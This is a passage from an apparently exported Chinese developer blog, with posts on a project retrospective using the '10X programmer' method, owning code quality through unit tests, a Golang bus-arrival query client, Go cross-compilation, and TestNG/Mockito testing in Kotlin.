工程中统一用Gradle构建，但是工程的构建脚本中没有指定构建的gradle版本号，gradle的wrapper文件没有提交到git仓库。由于每个人的开发环境存在差异，下载代码后出现你构建成功我构建失败的情况。旧项目早期就存在的构建规范和提交规范问题没有得到重视。新人接手时感觉就像在泥潭里构建系统。系统构建问题，是研发的一个共识问题，应当保证系统每日正常构建，保证提交代码的质量，但是这些我们做的都不好。在开发阶有人提交了一个无法编译通过的代码，合并后导致构建失败，前端小伙伴可能正在调试某个接口，突然就服务不可用了，容易影响对接进度。还有一个很关键的问题是单元测试和集成测试的问题没有落实到位，有几个核心类库是另外一个部门提供的，我们的使用不当导致上线后出现了很严重的bug，先不说类库的设计问题，我们在使用这些核心方法的时候没有做集成测试，没有文档，凭感觉就去使用了，如果做了集成测试，这些都可以避免。 项目总结经过这次项目，再结合10X程序员工作法，可以总结出几个问题： 需求不够明确，粒度太大看不到需求完成的标准，一个需求做的没完没了 任务分解不到位，遗漏细节和步骤 沟通反馈不够及时 日常构建不够好，经常构建失败中断测试。看过去大家都在忙碌的解决问题，但是解决的大多数都不是程序问题。 10X程序员工作法 大部分程序员忙碌解决的问题，都不是程序问题，而是由偶然复杂度导致的问题。如何减少偶然复杂度引发的问题，让软件开发工作有序、高效地进行是 10X工作法要阐述的核心内容。 《10X程序员工作法》这门课程阐述的其实是互联网团队如何能更加高效率的协作，不仅适用于程序员，也很适合项目经理，产品经理等人员。 《10X程序员工作法》主要原则有如下4个： 以终为始 任务分解 沟通反馈 自动化 以终为始 在做任何事情之前，先定义完成的标准。 这是一种向后工作法，遇到问题倒着想。“迁移角色权限”这个需求，倒着想就是系统A和系统B的角色权限都要迁移完成才算完成。应该把这个需求拆分成“系统A迁移角色权限”和“系统B迁移角色权限”这两个父需求。再把这两个父需求分配到对应的研发团队。研发团队A接收到“系统A迁移角色权限”这个需求后，第一步也是先确定完成的标准，要把角色A、B、C、D角色的权限都迁移完才算完成。 关于完成的定义，每个团队都有自己的标准，可以列一个DoD（Definition of Done，完成的定义）清单，由一个个的检查项组成的，用来检查我们的工作完成情况。DoD 的检查项应该是实际可检查的。 你说代码写好了，代码在哪里；你说测试覆盖率达标了，怎么看到；你说你功能做好了，演示一下。 当我们有了 DoD，做事只有两种状态，即“做完”和“没做完”。在团队协作中，我们经常会听到有人说“这个事做完了 80%”，对不起，那叫没做完，根本没有 80% 做完的说法。DoD 是一个的思维模式，是一种尽可能消除不确定性，达成共识的方式。 “以终为始”的方式，不仅仅可以帮我们规划工作，还可以帮我们发现工作中的问题。在做事之前先想结果是什么样子的，对做软件的人来说，我们应该把“终”定位成做一个对用户有价值的软件。 任务分解 在接到一个需求之后，先做任务分解。将一个原本毫无头绪的问题分解成若干个可以尝试回答的问题，写代码只是最后一步。 如今软件行业都在提倡拥抱变化，而任务分解是我们拥抱变化的前提。一个大问题，我们都很难给出答案，但回答小问题却是我们擅长的。用这种思路解决问题的难点是给出一个可执行的分解。 “系统A迁移角色权限”，任务分解123451. 迁移模板角色A的数据2. 迁移模板角色A权限数据3. 迁移子角色A数据4. 初始化子角色A的权限数据，根据所属的模板角色A进行权限复制5. 迁移子角色B的权限数据... 可以看到一个角色权限迁移包含里很多步骤，这些步骤缺一不可，并且要按照前后顺序。比如第2步的模板A角色的权限如果没有先迁移，先做了第4步复制模板角色A权限值就会复制到空值，造成数据缺失。 与很多实践相反，任务分解是一个知难行易的过程。不同的可执行定义差别在于，你是否能清楚地知道这个问题该如何解决。 按照完整实现一个需求的顺序去安排分解出来的任务，最好按照一个需求、一个需求的过程走，这样，任务是可以随时停下来的。检验每个任务项是否拆分到位，就是看你是否知道它应该怎么做了。 沟通反馈 站在更大的上下文中思考问题。 日常开发中会经常的有人告诉你这个需求很着急，销售已经把话吹出去了客户今天就要。产品经理说这个是老板要的，很着急… “任何需求的最佳完成时间都是昨天”，在时间规模为1的时间里，要同时做两个规模分别为1的需求，显然是不合理的。“这两个需求是领导要的，都很着急”，那就跳出自己的工作上下文，在一个更大的上下文中沟通，拉着产品经理一起去找老板，让领导决策那个需求更加重要。相信一个精明的领导是不会提出多个需求要在不够的时间内同时进行的。也许其中一个需求只是领导为了验证某种结果而提的，不马上做其实也可以，通过更大的上下文沟通知道可以放弃一个需求，就避免了可能出现的主要进度拖延问题。如果正的两个需求同等重要且紧急，在更大的上下文中和领导沟通，能够及时的反馈出自己项目人力有限，尽早的暴露出来给领导，让领导做决策是应该砍掉其中一个需求，还是由领导将其中一个需求分配给其他项目组来做，在更大的上下文中让领导协调资源是比较推荐的。 如果自己不能决策，就将问题尽早的暴露给更大的上下文，通过沟通反馈让领导决策。 自动化 软件产品解决了领域问题给用户带来了自动化，软件研发团队也应该用自动化的工具方便自己。 关于单元测试很多小伙伴都不怎么写，现在我越来越意识到单元测试的重要性，我对自己的代码要求必须要写单元测试。单元测试不仅是测试程序本身，还可以解决两个问题，一个是反向让自己面向接口编程写出可测试的代码，写需求之前要想着这个功能要如何验证，写出可测试的代码单元是很重要的，把方法解耦，规范自己的代码。另一个方面，提交前运行一下单元测试，可以验证是否有编译问题，最近的修改是否会影响已有代码的逻辑。如果单元测试不通过说明逻辑不通过，需要调整代码直到逻辑通过。再放心无脑的提交。 总结我们走敏捷开发，但任务看板上的很多需求也就只有一个标题来描述需求，基本没写用户故事和需求说明。虽然有原型图的链接，需求评审和需求会上也会描述产品原型，但是一个会议很难面面聚到，没有需求的描述补充，很容易遗漏细节，或者一个需求里包含了隐藏的子需求。导致研发在做这个需求的时候没有终点，看不到目标。 接到需求的第一件事是确定为何要做这个需求，如果没有用户故事，至少要先补充完成的标准，知道如何验证。 做需求前一定要先做任务分解，把需求分解成一个个可执行的任务，每做完一个任务，代码都是可以提交的。 跳出自己的一亩三分地，站在更大的上下文中沟通和思考问题。 在任务特别多的时候应该做一个优先级排序，把任务分解为“紧急”和“重要”两个维度。 重要且紧急的任务第一优先，重要不紧急的事情第二优先，紧急不重要的事情能不做就不做，或者与他人一起分担。不重要不紧急的事情不做 编写可测试的代码，多写单元测试，多学习好的设计，少一点问题。]]></content>
      <tags>
        <tag>工作总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[要对自己写的代码负责]]></title>
    <url>%2F66e5f5e%2F</url>
    <content type="text"><![CDATA[2019年04月18日星期五，最晚的一次下班打卡时间23点59分。这么晚下班并不是制度要求，而是我对自己不负责任的惩罚，冷静了一下，重新补充了单元测试。一个项目从开始前后端分离，就对前后端的技能有了更严格的要求。一个看似很简单的用户维护接口，我没有做到各种边界情况的充分考虑，没有维护单元测试代码，造成和前端对接过程中反复出现一些很低级的错误，影响了前端的对接进度，我很抱歉。在此检讨，时刻警醒！ 很幸运目前所在的部门实行弹性上班制度，朝九晚五的工作制度在互联网部门中应该是属于为数不多见的。 为什么我的代码会有BUG 总想为BUG找借口 BUG都是有原因的，虽然落地实现的代码是自己写的，但是总会找到一些借口，比如需求不清晰，设计不合理，历史遗留问题等导致的。但是归根结底，是因为自己没有独立思考导致的。开发不仅仅是实现功能，而且还要把不清晰的需求变清晰，不合理的设计变合理，把历史遗留问题逐渐改正的一个过程。 案例 一个很简单的用户维护功能 原型根据原型设计完成用户的增删改查功能这个原型只有3个页面：用户查询列表，用户详情页面，添加用户页面。在用户列表的页面上，原型所呈现出来的信息： 查询的用户包含禁用和启用状态的用户。 查询的用户排除已经被删除的用户。（虽然没有标注但是正常逻辑应该如此，除非这是一个比较特殊的平台） 用户所关联的平台已经被禁用或者删除，这过滤掉该用户。（虽然没有标注但是正常逻辑应该如此，除非这是一个比较特殊的平台） 在添加用户的页面上，原型标注了限制条件： 用户昵称不能大于5个中文字符，不能大于10个英文字符 账号不能大于10个字符 密码必须大于3个字符小于20个字符 账号必须唯一，同一个平台下的账号被删除后，可以创建相同的账号 在编辑用户的页面上，和产品讨论了限制条件： 用户自己不能编辑自己（包括管理员角色） 只有管理员可以编辑用户（其他非管理员用户没有编辑用户的权限） 这些原型全都属于一个迭代里的需求，需要把已有的几套有关联性平台的用户体系都进行调整。 约定在需求评审会议上，添加用户页面的限制条件被忽略，通常都认为这是一个很简单的功能，能够达成共识，所以一句话带过。在一些细节上没有做到很好的约定。在后续迭代过程中，产品可能因为用户的反馈，将添加用户页面的限制进行调整。有的限制条件没有及时在原型上进行标注，导致产品、测试、前端、后端的需求不一致问题。 在迭代开发前，后端和前端约定了3个接口，分别是：用户列表查询，用户详情查询，新增与编辑用户接口。 实操因为这不是一个新项目，所以代码中已经有一些封装好的方法了，比如根据用户账号名获取用户信息getUserByUserName方法，根据用户id获取用户详情getUserById方法。底下所写的SQL很自然的会认为他是一个没有问题的SQL，毕竟项目运行这么久了，有BUG线上早就出问题了不是吗？ 这种思想是非常危险的！！！ 首先，我们拿什么保证自己的代码是没有问题的？工程中的单元测试没有覆盖到DAO层的方法，也没有进行系统集成测试。之前的稳定完全靠测试验证然后不断的改BUG来完成。有些边界值可能测试也不一定会覆盖得到，线上没有问题只能反映当下的业务逻辑没有触发到问题所在，不能等到线上出问题了再来排查。 其次，查询一个用户不仅是根据id查就完事了，还要根据当前的业务规则，比如查询没有被标记为删除并且所关联的平台账号没有没禁用或者删除的用户。 新增用户 根据页面原型，定义入参字段，添加入参限制。 坑1：用户启用状态status字段在用户表中的类型为tinyint(1)，映射到Java的PO类为Boolean类型。但是另一个表的status字段类型却是tinyint(3)，映射到PO类为Byte类型。虽然类型都是tinyint但是因为长度的不同导致所映射的PO类型出现不同。两套平台的代码都是要按照原型来修改的，因为用户体系一样，表结构一样，所以我就把入参实体直接拷贝过来，但是却忽略了两套平台的工程所用的ORM框架是不一样的，导致ORM无法匹配到PO字段的类型，数据传到PO后status字段值却无法更新到数据库中。 坑2：新增用户，原型的要求是 同一个平台下的账号被删除后，可以创建相同的账号，这个功能在另外的一套相同用户体系中已经实现过了，于是使用已有的方法getUserByUserName查询是否存在相同名称的账号，如果存在就返回提示不允许添加相同账号。把Controller和Serveice相关功能的代码直接拷贝过来，修改入参实体名，导包，修复红色错误提示等一些操作。直到代码没有语法错误后就觉得大功告成了，只需要运行验证一下即可。这种做法是非常危险的！！！这个时候很可能临时有其他更高级别的任务被分配进来，然后中断当前的任务，去做其他事了。等回过头来就有一种已经验证过这个功能的幻觉。因为在其他套工程中确实是验证过了，但是在当前工程中还没有验证过！ 刚好这套工程一直以来在DAO层一直都有一个getUserByUserName方法，这个方法底下的SQL只根据账号名称查询用户信息，并没有根据用户当前所在平台的删除状态进行过滤，导致已经删除的用户名无法再被该平台新建。 编辑用户 编辑用户与前端约定的接口是和新增用户同一个接口，接口根据时否有传用户id作为新增和更新的依据。 坑3：传用户id进行更新的时候，是否需要把用户的所有信息都传过来？前端如果不传值过来，后端是否会更新对应字段？还是将对应字段更新成空值？根据当前的原型设计，在用户详情页面中没有密码输入框，所以前端应该不传密码。但是我的接口逻辑没有跟着原型修改，无论是新增还是编辑，都会判断密码不能超过3个字符小于20个字符。前端不传密码的时候就会返回限制信息。 坑4：用户账号能否修改，将一个账号名改成另外一个账号名？ 站在实际的业务角度出发，用户的登录账号是不应该被修改的，因为登录账号相当于一个用户的系统登录凭证。但具体能不能修改并不是绝对的，还是要看这个系统所处的位置和功能需求。在原型设计上，并没有标注出账号是否能被编辑，而我在实际开发中也没有注意到这一点，所以根据约定、前端如果传了用户Id，那么就会根据用户Id对用户的信息进行更新，包括登录账号。这时候又挖了另一个大坑。首先假设需求上允许修改成另外一个用户名，从接口功能上，我没有对这种情况做限制，通过接口，用户可以将自己的登录账号更新成另外一个已经存在的用户名。原则上前端把用户账号的输入框限制成不允许编辑就不会存在这种情况。但是在前后端分离的项目中，后端接口必须考虑这种情况。现实场景中用户可能通过一些手段跳过前端页面限制直接请求接口。 对这些不清晰的需求，要及时和产品沟通，并且信息同步给小组的所有人。 其他的一些问题关于 用户昵称不能大于5个中文字符，不能大于10个英文字符这个需求有点奇怪，他是以数据库的视角来考虑长度的，在MySQL的varchar类型字段中，中文占用2个字节，英文占用1个字节，1个中文字符的占用大小等于2个英文字符的占用大小。其实这个存储空间和字符长度是没有关系的。 在程序设计角度考虑，这个功能限制其实是用户昵称不能超过10个字节，只要遍历每个字符的ASCII码，大于255的都是非英文，这样就能统计出英文和中文的个数了。 这种限制在用户实际使用中会出现很奇葩的问题，出现了无限多可能。输入了3个中文后，只能再输入4个英文。输入了4个中文后，最多只能再输入2个英文，比如中国人abcd，中华人民ai,这些字符长度已经达到了10个字节，中英文混用的情况用户还要考虑一个中文等于多少个字母… 有些不合理的需求，或者变动比较频繁的需求，开发人员应该跟产品经理讨论具体的方案。否则出问题的时候就会导致BUG满天飞。这次修改涉及到多个端的工程，不是少这就是少那，把所做的工作变成了一个逐渐被否定的过程，真的感到很惭愧。希望后续能够统一用户体系和设计，把用户管理这块功能独立成一个服务，避免做重复的无用功，把单元测试和系统集成测试都完善才能保证质量。 怎样才能保证代码质量 想快速的解决问题，却不能稳定的持续 为什么我的代码没有质量保证 Q：现在线上运行的工程，他的业务规则是什么样的？允不允许这样或者那样的边界情况？会报什么错有哪些提示？ 也许自己当前正在着手维护这套工程，可以马上回答出来，但是如果是半年前开发的并且中间跑去开发其他项目了，那么这个问题就不一定能马上回答上来了，跑去看代码心里也是没有底的，因为代码中不会太直观的体现出所有的边界情况，除非写了一大段的文字注释。如果这套代码是从其他开发者继承过来的，可能还会有注释和代码不匹配的情况。 在复杂多变的业务领域，我们无法用自己的基础知识去保证代码质量。业务庞大且错综复杂的时候，没有理清关系很容易陷入进去。之前的很多需求都是口口相传，很久之前做的业务逻辑基本都忘记了，看原型还要想好久才能想起来，而且还不能很确定。这些东西没有一个记录，即使有文档也要重新理解很久。 以后要如何做 放慢脚步，戒骄戒躁。用心写单元测试 欲速则不达，关注了数量，却忽略了质量。发现缺少某个接口，以最快速度写完提交代码发布测试服，虽然在很多情况下接口可能是没有问题的，但是如果非要去深究，每个接口可能都是有问题的！前后端分离的项目，后端真的对每个参数都做了严格的限制了吗？很多限制其实还是依赖前端自身的输入限制，至少我在补单元测试的时候发现很多限制都没有做。很多琐碎的任务不能成为不写单元测试的借口，如果静下心来写单元测试，是不是琐碎的需求就会少一些了呢？ 某位领导曾经说过，在变更控制系统里的记录是很必要的，我们没事的时候不会随便去动业务代码，应该多去学习，提高技能。当需要我们动业务代码的时候无非是两种情况：有需求、有缺陷。 每一个需求和缺陷都尽量能够清晰的表达，并且指派给对应的人去完成。每一个需求和缺陷的规模点和完成时间应该把写单元测试的时间也考虑进去，因为单元测试是开发人员对自己代码质量的保证，如果自己都没有自检过，那这个任务不应该算完成。可能会造成一个功能在开发和测试之间反复流转。 单元测试是代码的防腐剂，代码开箱重新修改，对应的也需要重新更新防腐剂，否则代码将没有质量保证。保证代码质量是一个不断提升和不断学习的过程，道路阻且长，努力加餐。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Golang快速实现公交查询服务]]></title>
    <url>%2Fe94e9954%2F</url>
    <content type="text"><![CDATA[需求来源于生活，每到周末都会去游泳，出行工具基本上都是公交。要做的事情很简单，需要一个卡着公交到站点的时间到达公交站。目前已经有很多第三方的公交查询软件，之所以要自己造轮子的原因是我觉得这些第三方目前做的不够成熟，没有我需要的数据，比如一天中公交到站的时间点有哪些。查询公交只是一个基础服务，我要做的是能够根据自己的生活规律和时间规划完成一个全自动提醒出行的方案，实现历史到站统计和数据分析的功能。 等公交的过程就像在浪费生命，如何使得等公交变得有意义是一个值得思考的问题🤔 故事背景有一次我在公交站等了将近30分钟的公交车，还不见发车，当时的想法是如果早知道不发车我就选择打车，或者晚点出门做一些有意义的事了。但是我要如何才能实现早知道？周末出行的时间不固定，和朋友约好的时间也不固定，想要卡着时间点坐上公交，可以自己花几个周末一天啥事都不干，就盯着公交到站，然后记录一下时间，下次根据这个时间选择合理的出门时间。但是这样太蠢了！既然目前已经有这么多公交查询软件，何不写个程序每时每刻都自动获取公交到站情况并且记录下来呢？说干就干。 目前的第三方公交查询服务有很多，我目前所在的城市（厦门市）比较权威的公交查询主要是掌上公交App。抓包-&gt;分析-&gt;构造请求(这些日常操作这里就省略了) 基础功能 掌上公交在厦门市目前是一个比较精准的公交查询数据服务，通过分析发现不仅提供了公交站点查询、公交信息查询，这些信息里面还包含了实时的公交GPS的经纬度，通过位置可以计算出公交距离目标站点的距离。 通过掌上公交的数据接口要实现以下两个基础功能 [公交站点信息] 查询指定路线上的所有公交站点信息 [公交实时信息] 查询指定路线当前即将到站的所有公交实时信息 公交站点信息 查询指定路线上的所有公交站点信息。 程序代码首先根据接口请求响应的json数据，编写映射实体bus_station_api.go123456789101112131415161718192021222324252627282930313233343536373839// 站点数据type StationData struct &#123; StationId int `json:"stationId"` // 站点id StationName string `json:"stationName"` // 站点名称 StationLon float64 `json:"station_lon"` // 经度 StationLat float64 `json:"station_lat"` // 纬度 StationOrder int `json:"stationOrder"` // 站点序号 ShowName string `json:"showName"` // 显示名称 Come int `json:"come"` // 到达状态 Arrive int `json:"arrive"` // 驾驶状态&#125;// 站点信息type StationInfo struct &#123; RouteName string `json:"routeName"` // 公交路线名称 UpperOrDown string `json:"upperOrDown"` // 正向1 逆向2 BeginTime string `json:"beginTime"` // 首班车时间 EndTime string `json:"endTime"` // 末班车时间 PlanTime string `json:"planTime"` // 计划发车时间 Common string `json:"commonts"` // 路线描述 Data []StationData `json:"data"` // 站点数据&#125;const StationInfoCmd = "103" // 查询站点信息操作码// 获取路线上所有公交站点信息func GetRouteAllStationInfo(requestURL string, cityName string, routeName string, direction string) *StationInfo &#123; response, _ := http.Post(requestURL, "application/x-www-form-urlencoded", strings.NewReader( "CMD="+StationInfoCmd+ "&amp;CITYNAME="+cityName+ "&amp;LINENAME="+routeName+ "&amp;DIRECTION="+direction+ "")) body, _ := ioutil.ReadAll(response.Body) var resp StationInfo _ = json.Unmarshal([]byte(string(body)), &amp;resp) log.Println("公交站点信息:" + string(body)) return &amp;resp&#125; 测试代码bus_station_api_test.go123456789101112func TestGetRouteAllStationInfo(t *testing.T) &#123; url := "https://wx.shenghuoquan.cn/WxBusServer/ApiData.do" cityName := "厦门市" routeName := "641路" direction := "2" stationInfo := GetRouteAllStationInfo(url, cityName, routeName, direction) for i := 0; i &lt; len(stationInfo.Data); i++ &#123; // 打印站点索引位置和站点名称 t.Log(stationInfo.Data[i].StationOrder, stationInfo.Data[i].StationName) &#125;&#125; 公交实时信息 查询指定路线当前即将到站的所有公交实时信息 程序代码bus_info_api.go123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// 主要数据type InfoData struct &#123; StationName string `json:"stationName"` // 站点名称 Index int `json:"index"` // 站点在路线上的索引位置 从0开始 Arrive int `json:"arrive"` // 驾驶状态 0行驶中 1停止行驶 Come int `json:"come"` // 到站状态 0已到站 1即将到站 ShowType int `json:"showType"` // 显示类型&#125;// 详细数据type InfoList struct &#123; StationName string `json:"stationName"` // 站点名称 StatusType string `json:"statusType"` // 状态类别 0已到站 2即将到站 Index int `json:"index"` // 站点在路线上的索引位置 从0开始 StationLat float64 `json:"station_lat"` // 经度 StationLng float64 `json:"station_lng"` // 纬度 BusLat float64 `json:"bus_lat"` // 公交经度 BusLng float64 `json:"bus_lng"` // 公交纬度 BusNumber string `json:"busNumber"` // 公交车牌号码 CrowdedStatus string `json:"crowdedStatus"` // 拥挤状态 BusToStationNiheDistance float64 `json:"busToStationNiheDistance"` // 公交到站距离 NihePointIndex int `json:"nihePointIndex"` // 附近点指数 Angle float64 `json:"angle"` // 角度 RouteNumber string `json:"routeNumber"` // 路由号 UpperOrDown string `json:"upperOrDown"` // 正向或逆向 BusIcon string `json:"busIcon"` // 公交图标 RecTime int `json:"_recTime"` // 获取时间&#125;// 公交信息type Info struct &#123; Data []InfoData `json:"data"` List []InfoList `json:"list"`&#125;const busInfoCmd = "104" // 查询站点信息操作码// 获取指定路线的公交实时信息func GetRouteBusInfo(requestURL string, cityName string, routeName string, direction string) *Info &#123; response, _ := http.Post(requestURL, "application/x-www-form-urlencoded", strings.NewReader( "CMD="+busInfoCmd+ "&amp;CITYNAME="+cityName+ "&amp;LINENAME="+routeName+ "&amp;DIRECTION="+direction+ "")) body, _ := ioutil.ReadAll(response.Body) var resp Info _ = json.Unmarshal([]byte(string(body)), &amp;resp) log.Println("公交实时信息：" + string(body)) return &amp;resp&#125; 测试代码bus_info_api_test.go12345678910111213141516func TestGetRouteBusInfo(t *testing.T) &#123; url := "https://wx.shenghuoquan.cn/WxBusServer/ApiData.do" cityName := "厦门市" routeName := "641路" direction := "2" busInfo := GetRouteBusInfo(url, cityName, routeName, direction) for i := 0; i &lt; len(busInfo.List); i++ &#123; switch busInfo.List[i].StatusType &#123; case "0": t.Logf("公交站索引:%3d %s[即将到站]",busInfo.List[i].Index, busInfo.List[i].StationName) case "2": t.Logf("公交站索引:%3d %s[已经到站]",busInfo.List[i].Index, busInfo.List[i].StationName) &#125; &#125;&#125; 经过分析，查询公交和站点的基础的数据接口就只有这两个，通过分析可以发现掌上公交的一些基础数据处理都是在客户端来做的 掌上公交客户端的参数都是固定的（城市名称，路线名称，方向，请求操作码），客户端主要做了两件事 通过获取站点信息，得到每个站点的索引值 通过查询公交实时信息，得到公交目前所在的索引，客户端通过目标站点索引和公交站点索引计算出距离的站点 我认为这一部分也应该由后端来做，并且应该做得更加具体。掌上公交接口根据操作码提供了数据，与其说是一个接口服务，不如说他是一个更加偏向于数据的基础服务。我要做的就是整合不同的数据服务，实现一个公交中台服务。前台只需要数据请求和获取能力。 其中站点的数据是固定不变的，可以将站点数据存储到数据库中，为了每次查询速度更快，把站点数据也存到了redis中，实现前端根可以根据站点名称进行查询。具体代码就不贴了，完整代码和Release版本在GitHub上：https://github.com/lanshiqin/bus_notify 扩展功能（未完待续） 统计指定路线的公交每天的到站时间点 根据用户出行速度推送最优的乘车时间点]]></content>
  </entry>
  <entry>
    <title><![CDATA[Golang交叉编译各平台的可执行二进制程序]]></title>
    <url>%2F92119e60%2F</url>
    <content type="text"><![CDATA[Golang是一种静态强类型并且具有垃圾回收机制天生支持高并发的编程语言。相比于Python、PHP等动态脚本语言，Golang的天生优势是可以不需要解释器直接编译成目标平台的可执行程序，可以不需要依赖外部容器比如Nginx等，Golang内置的http包可以快速构建出一个支持高并发的web服务。 快速构建 一个简单的Golang的Web服务只需要几行代码 新建文件 server.go1234567891011package mainimport "net/http"func indexHandler(w http.ResponseWriter, r *http.Request) &#123; _, _ = w.Write([]byte("Hello,World!"))&#125;func main() &#123; http.HandleFunc("/",indexHandler) _ = http.ListenAndServe(":9999", nil)&#125; http.HandleFunc()用来绑定URL和处理对应URL请求的Handler方法http.ListenAndServe()指定监听的端口，开启一个http服务。 Golang的http包提供了协程，天生支持高并发。相比于Python和Node.js等也是几行代码可以搞定一个web服务，Golang的另一个优势是真正的跨平台，可以快速编译成目标平台的可执行文件，甚至可以把这个http服务编译成Android平台的arm linux架构的可执行程序，直接在手机上启动web服务。可以用Golang来写各种工具和轮子实现为所欲为的骚操作。 go run Golang可以使用go run解释执行 打开控制台切换到当前目录执行1go run server.go 打开浏览器访问 http://localhost:9999/, 可以看到浏览器输出了Hello，World！ go build Golang可以使用go build编译成当前平台的可执行程序 打开控制台切换到当前目录执行1go build server.go 执行完毕后会在当前目录生成一个可执行程序server，双击可执行程序或者在命令行下执行./server。打开浏览器访问 http://localhost:9999/, 可以看到浏览器输出了Hello，World！ 交叉编译 Golang可以在任意平台编译成其他目标平台的二进制可执行程序，只需要在go build前指定目标平台的系统类型和CPU指令集架构即可。 1234567891011# mac上编译linux和windows二进制CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build server.goCGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build server.go# linux上编译mac和windows二进制CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build server.goCGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build server.go# windows上编译mac和linux二进制SET CGO_ENABLED=0 SET GOOS=darwin SET GOARCH=amd64 go build server.goSET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build server.go 编译成目标平台的可执行程序只需要一行命令就搞定，比如切换当前目录执行 1CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build server.go 编译完成后就会在当前目录下生成server.exe的可执行文件，可以把该文件复制到Windows平台的电脑上双击运行，然后打开浏览器访问 http://localhost:9999/, 可以看到浏览器输出了Hello，World！ 编译参数说明CGO_ENABLED 设置为0表示不启用CGO进行编译，代码中如果有用到C语言相关的库,编译时就需要开启CGO_ENABLED=1GOOS 指定了目标的操作系统类型GOARCH 指定了目标的CPU架构类型 如果想将该服务编译成android平台（arm linux）的可执行程序，只需改变一下参数即可1CGO_ENABLED=0 GOARCH=arm GOOS=linux go build server.go 编译完成后通过adb等工具将可执行程序push到手机的指定目录下，然后授予可执行权限即可在手机本机上运行web服务。so easy！]]></content>
  </entry>
  <entry>
    <title><![CDATA[使用TestNG进行单元测试]]></title>
    <url>%2F5aca068f%2F</url>
    <content type="text"><![CDATA[单元测试指的是对软件系统中的最小可测单元进行测试和验证。在面向对象的程序设计中，一个类中最小可执行单元通常是作为一个函数或者方法，单元测试要尽可能的对所有的方法覆盖，对预期结果和实际结果进行验证。在这里首先要感谢我现在所在公司给与的培训，感谢同事的分享让我更加明白单元测试的必要性。 非单元测试 在开始单元测试前，我们先来看看不属于单元测试的内容 新建一个SpringBoot模板工程，可以看到在工程结构中src源代码目录下有两个模块，一个是main模块用来编写和存放业务代码，另一个是test模块，用来对业务功能进行测试，在test模块的文件层级下可以看到SpringBoot已经默认为我们初始化了一个测试模板: 123456789@RunWith(SpringRunner::class)@SpringBootTestclass BootApplicationTests &#123; @Test fun contextLoads() &#123; &#125;&#125; @RunWith(SpringRunner::class)和@SpringBootTest注解将会在测试运行时加载和启动Spring的上下文测试环境。 网上很多文章写的单元测试都是用这个注解，在了解单元测试之前我看过很多篇文章的单元测试都是这么写的，使我对单元测试造成了一定的误解，其实这个是集成测试的部分，是对整个系统的测试，不是单元测试！ 单元测试 下面开始进行单元测试的内容，我使用Kotlin+Gradle的方式创建了一个Spring Boot的项目 在Java开发中单元测试的工具有很多比如Junit，这里我使用的是TestNG，他继承了Junit的特性并且简洁对代码无污染，且功能强大。 引入TestNG相关的依赖包1234// testng依赖testCompile group: 'org.testng', name: 'testng', version: '6.14.3'// 引入kotlin的mock相关依赖，才能在kotlin的工程代码中使用mock()方法进行对象mock()testCompile group: 'com.nhaarman', name: 'mockito-kotlin', version: '1.6.0' 比如在UserController中有个用户登录的login方法： 1234567891011121314151617181920212223242526272829303132333435363738@RestController@RequestMapping("/user")class UserController &#123; val logger = LoggerFactory.getLogger(UserController::class.java)!! @Autowired lateinit var i18NService: I18NService @Autowired lateinit var userService: MerUserService @PostMapping("login") fun login(@RequestBody userLoginRequest: UserLoginRequest): ApiResponse&lt;CoMerUserResponse&gt; &#123; logger.info("登录信息" + JSON.toJSONString(userLoginRequest)) try &#123; val md5Pwd = CryptoUtil.getMD5String(userLoginRequest.password) val user = userService.getUser(userLoginRequest.username, md5Pwd) if (user != null) &#123; // 用户被删除或禁用 || 用户所属的商户被删除或禁用 if (user.userDelete == 1 || user.userAvalible == 0 || user.merDeleted == 1 || user.merAvalible == 0) &#123; logger.info("账号异常:" + JSON.toJSONString(user)) return ApiResponse.fail(ERROR_CODE, i18NService.getI18N("mer.coupon.accountError")) &#125; return ApiResponse.succ(user) &#125; else &#123; return ApiResponse.fail(ERROR_CODE, i18NService.getI18N("mer.coupon.userError")) &#125; &#125; catch (e: Exception) &#123; logger.error(e.printStackTrace().toString()) return ApiResponse.fail(ERROR_CODE, i18NService.getI18N("mer.coupon.loginError")) &#125; &#125;&#125; 生成单元测试代码我们要对UserController的login方法进行单元测试，我使用的开发工具是IDEA，在Mac上command+shift+t, 如果是Windows则按controller+shift+t，选择Create New Test，选择要创建单元测试的方法进行快速生成。勾选 SetUp/@Before 和 tearDown/@After，生成如下单元测试代码 1234567891011121314151617181920212223import org.testng.annotations.Testimport org.testng.Assert.*import org.testng.annotations.AfterMethodimport org.testng.annotations.BeforeMethodclass UserControllerTest &#123; @BeforeMethod fun setUp() &#123; // 测试前 &#125; @Test fun testLogin() &#123; // 测试中，测试的对应方法 &#125; @AfterMethod fun tearDown() &#123; // 测试后 &#125;&#125; 由于我们只对UserController类的login方法进行单元测试，该方法所依赖的Service等对象的方法和行为我们都需要进行Mock。这里暂且不讨论代码写的如何，也不必关心login方法中所调用的Service层的具体实现，login只需要关系自己的逻辑即可。 在login方法中调用了userService.getUser来获取一个用户对象，通过判断用户是否存在进行下一步的逻辑验证，如果出现错误需要调用i18NService.getI18N这个方法用来向用户返回对应的提示信息。这两处调用属于外部依赖的，无论实际业务代码是否实现这个功能，我们都不必关心，只需要Mock模拟这写对象的调用行为即可。login只对自身方法的逻辑进行验证。 需要Mock的数据有：1234userService.getUser(userLoginRequest.username, md5Pwd)i18NService.getI18N("mer.coupon.accountError")i18NService.getI18N("mer.coupon.userError")i18NService.getI18N("mer.coupon.loginError") 使用when()进行Mock数据比如userService.getUser()这个方法将会根据传入的参数去查询用户是否存在，如果存在则返回对象。这里不必关心具体的用户数据，只需要关心login()自身的逻辑，所以我们对这个方法进行Mock即可，比如:1`when`(userService.getUser(username, password)).thenReturn(response) thenReturn(response)中的response是我们自己构造的对象，when().thenReturn()在实际单元测试时，将会模拟when()中的代码行为，并且通过thenReturn()返回调用该方法的返回值。这个返回值可以在单元测试中进行模拟。 